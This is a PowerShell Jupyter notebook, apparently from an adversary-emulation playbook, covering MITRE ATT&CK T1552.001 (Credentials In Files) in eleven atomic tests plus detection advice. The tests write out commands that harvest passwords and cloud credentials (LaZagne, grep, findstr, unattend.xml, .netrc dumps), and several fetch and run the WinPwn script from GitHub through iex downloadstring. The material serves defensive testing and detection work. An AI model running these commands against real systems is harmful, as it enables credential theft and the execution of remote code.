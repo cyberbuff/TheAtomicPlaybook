{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "11a43d41",
   "metadata": {},
   "source": "# T1552.001 - Credentials In Files\nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)"
  },
  {
   "cell_type": "markdown",
   "id": "f570aca3",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "60492c07",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Extract Browser and System credentials with LaZagne",
    "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\npython2 laZagne.py all\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9f6c297",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1a827a25",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Extract passwords with grep",
    "Extracting credentials from files\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ngrep -ri password /\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2b5e312d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "671ec60f",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Extracting passwords with findstr",
    "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nfindstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "edb88bad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "dcb91d89",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Access unattend.xml",
    "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ntype C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "351a07c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "1d124e7b",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Find and Access Github Credentials",
    "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
    "**Supported Platforms:** macos, linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nfor file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b1d246a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "50fbde1d",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - sensitivefiles",
    "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6227145",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "3005982c",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - Snaffler",
    "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23567cd3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "88eb0141",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - WinPwn - powershellsensitive",
    "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "af78a47c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "f9da546e",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - WinPwn - passhunt",
    "Search for Passwords on this system using passhunt via WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc8e74ef",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "fb70bb40",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nrm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f027a6c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cc77d66f",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - WinPwn - SessionGopher",
    "Launches SessionGopher on this system via WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e9bb01f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "c138e61e",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",
    "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9399225f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.001 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "61cb55db",
   "metadata": {},
   "source": "## Detection\nWhile detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}